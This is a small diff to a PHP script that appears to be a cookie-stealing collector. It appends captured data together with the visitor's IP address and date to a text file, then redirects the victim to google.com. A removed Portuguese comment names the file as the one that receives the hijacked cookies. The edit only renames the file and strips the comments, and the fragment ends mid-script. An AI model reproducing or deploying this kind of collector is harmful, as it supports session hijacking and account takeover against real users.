@@ -5,9 +5,8 @@
 
 */
 
-$fileName="cookies.txt"; // Arquivo para receber o sequestro.
-$redirect = "https://google.com/"; // URL que o usuário vai ser redirecionado.
-
+$fileName="cookie.txt"; 
+$redirect = "https://google.com/";
 $f=fopen($fileName,'a');
 $ip = $_SERVER['REMOTE_ADDR'];
 $date = date("d/m/Y");
